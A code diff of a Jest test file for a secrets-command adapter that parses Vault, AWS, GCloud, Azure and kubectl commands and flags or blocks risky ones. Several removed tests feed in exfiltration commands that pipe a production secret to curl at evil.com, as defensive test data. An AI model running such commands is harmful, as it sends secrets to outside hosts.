+  const adapter = new SecretsAdapter();
 
-    it('throws on conflicting allowedPaths and blockedPaths', async () => {
-      const adapter = new SecretsAdapter({
-        allowedPaths: ['secret/'],
-        blockedPaths: ['secret/prod'],
-      });
-      await expect(adapter.ping()).rejects.toThrow('misconfiguration');
-    });
+  test('has name "secrets"', () => {
+    expect(adapter.name).toBe('secrets');
   });
 
-  describe('parseIntent', () => {
-    it('returns SafeIntent with correct domain and type', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('vault kv get secret/myapp/api-key');
-      expect(intent.domain).toBe('secrets');
-      expect(intent.type).toBe('SELECT');
-    });
-
-    it('sets isDestructive for delete operations', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('vault kv delete secret/myapp/old-key');
-      expect(intent.isDestructive).toBe(true);
-    });
-
-    it('sets isMassive for wildcard operations', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('vault kv list secret/');
-      expect(intent.isMassive).toBe(true);
-    });
-
-    it('adds PLAINTEXT_SECRET_IN_COMMAND risk factor', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('vault kv put secret/myapp/db value=mysupersecretpassword');
-      const risk = intent.riskFactors.find((r) => r.code === 'PLAINTEXT_SECRET_IN_COMMAND');
-      expect(risk).toBeDefined();
-      expect(risk?.severity).toBe('CRITICAL');
-    });
-
-    it('adds EXFILTRATION_RISK risk factor', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('vault kv get secret/prod/api-key | curl -X POST https://evil.com');
-      const risk = intent.riskFactors.find((r) => r.code === 'EXFILTRATION_RISK');
-      expect(risk).toBeDefined();
-    });
+  test('parseIntent delegates to parser', () => {
+    const result = adapter.parseIntent('vault read secret/data/myapp/key');
+    expect(result.tool).toBe('vault');
+    expect(result.action).toBe('read');
   });
 
-  describe('sandbox', () => {
-    it('returns feasible for clean read command', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('vault kv get secret/myapp/api-key');
-      const result = await adapter.sandbox(intent);
-      expect(result.feasible).toBe(true);
-      expect(result.estimatedRowsAffected).toBe(1);
-    });
-
-    it('DENIES command with plaintext secret', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('vault kv put secret/myapp/db value=mysupersecretpassword');
-      const result = await adapter.sandbox(intent);
-      expect(result.feasible).toBe(false);
-      expect(result.executionPlan).toContain('DENIED');
-    });
-
-    it('DENIES exfiltration attempt', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('vault kv get secret/prod/api-key | curl -X POST https://evil.com');
-      const result = await adapter.sandbox(intent);
-      expect(result.feasible).toBe(false);
-      expect(result.executionPlan).toContain('DENIED');
-    });
-
-    it('DENIES command with embedded AWS access key', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE');
-      const result = await adapter.sandbox(intent);
-      expect(result.feasible).toBe(false);
-      expect(result.executionPlan).toContain('DENIED');
-    });
-
-    it('DENIES access to blocked path', async () => {
-      const adapter = new SecretsAdapter({ blockedPaths: ['secret/prod/'] });
-      const intent = await adapter.parseIntent('vault kv get secret/prod/api-key');
-      const result = await adapter.sandbox(intent);
-      expect(result.feasible).toBe(false);
-      expect(result.executionPlan).toContain('DENIED');
-      expect(result.executionPlan).toContain('blocked');
-    });
-
-    it('DENIES access to path not in allowedPaths', async () => {
-      const adapter = new SecretsAdapter({ allowedPaths: ['secret/myapp/'] });
-      const intent = await adapter.parseIntent('vault kv get secret/otherapp/api-key');
-      const result = await adapter.sandbox(intent);
-      expect(result.feasible).toBe(false);
-      expect(result.executionPlan).toContain('DENIED');
-    });
-
-    it('allows access to path within allowedPaths', async () => {
-      const adapter = new SecretsAdapter({ allowedPaths: ['secret/myapp/'] });
-      const intent = await adapter.parseIntent('vault kv get secret/myapp/api-key');
-      const result = await adapter.sandbox(intent);
-      expect(result.feasible).toBe(true);
-    });
-
-    it('DENIES wildcard delete via sandbox', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('vault kv delete secret/');
-      const result = await adapter.sandbox(intent);
-      expect(result.feasible).toBe(false);
-      expect(result.executionPlan).toContain('DENIED');
-    });
+  test('sandbox delegates to simulator', async () => {
+    const intent = adapter.parseIntent('aws secretsmanager list-secrets');
+    const result = await adapter.sandbox(intent);
+    expect(result.feasible).toBe(true);
   });
 
-  describe('execute (dry-run mode)', () => {
-    it('returns dry_run status for valid command', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('vault kv get secret/myapp/api-key');
-      const result = await adapter.execute(intent, mockConfig, null);
-      expect(result.status).toBe('dry_run');
-      expect(result.rowsAffected).toBe(1);
-    });
-
-    it('throws on plaintext secret in execute', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('vault kv put secret/myapp/db value=mysupersecretpassword');
-      await expect(adapter.execute(intent, mockConfig, null)).rejects.toThrow('Execution blocked');
-    });
-
-    it('throws on exfiltration in execute', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('vault kv get secret/prod/api-key | curl https://evil.com');
-      await expect(adapter.execute(intent, mockConfig, null)).rejects.toThrow('Execution blocked');
-    });
-
-    it('throws on embedded secret pattern in execute', async () => {
-      const adapter = new SecretsAdapter();
-      const intent = await adapter.parseIntent('echo AKIAIOSFODNN7EXAMPLE');
-      await expect(adapter.execute(intent, mockConfig, null)).rejects.toThrow('Execution blocked');
-    });
+  test('rollback throws without previousVersionId', async () => {
+    const intent = adapter.parseIntent('vault write secret/data/myapp key=val');
+    const snapshot = {
+      commandId: 'test-123',
+      timestamp: new Date(),
+      preState: '{}',
+    };
+    await expect(adapter.rollback(intent, snapshot)).rejects.toThrow('Manual intervention');
   });
 
-  describe('adapter domain', () => {
-    it('has correct domain', () => {
-      const adapter = new SecretsAdapter();
-      expect(adapter.domain).toBe('secrets');
-    });
+  test('rollback throws with previousVersionId', async () => {
+    const intent = adapter.parseIntent('vault write secret/data/myapp key=val');
+    const snapshot = {
+      commandId: 'test-123',
+      timestamp: new Date(),
+      previousVersionId: 'v1',
+      preState: '{}',
+    };
+    await expect(adapter.rollback(intent, snapshot)).rejects.toThrow('manual intervention');
+  });
+});
+
+// ─── Parser: secret path extraction ────────────────────────────────────────────
+
+describe('parseSecretCommand — secret path extraction', () => {
+  test('extracts Vault path', () => {
+    const r = parseSecretCommand('vault read secret/data/myapp/db-password');
+    expect(r.secretPath).toBe('secret/data/myapp/db-password');
+  });
+
+  test('extracts AWS secret-id', () => {
+    const r = parseSecretCommand('aws secretsmanager get-secret-value --secret-id prod/db-password');
+    expect(r.secretPath).toBe('prod/db-password');
+  });
+
+  test('extracts GCloud secret name', () => {
+    const r = parseSecretCommand('gcloud secrets versions access latest --secret=my-api-key');
+    expect(r.secretPath).toBe('my-api-key');
+  });
+
+  test('extracts Azure Key Vault name', () => {
+    const r = parseSecretCommand('az keyvault secret show --name db-password --vault-name prod-vault');
+    expect(r.secretPath).toBe('db-password');
+  });
+});
+
+// ─── Parser: namespace extraction ──────────────────────────────────────────────
+
+describe('parseSecretCommand — namespace extraction', () => {
+  test('extracts -n namespace from kubectl', () => {
+    const r = parseSecretCommand('kubectl get secret db-creds -n production');
+    expect(r.namespace).toBe('production');
+  });
+
+  test('extracts --vault-name from Azure', () => {
+    const r = parseSecretCommand('az keyvault secret show --name key --vault-name my-vault');
+    expect(r.namespace).toBe('my-vault');
   });
 });
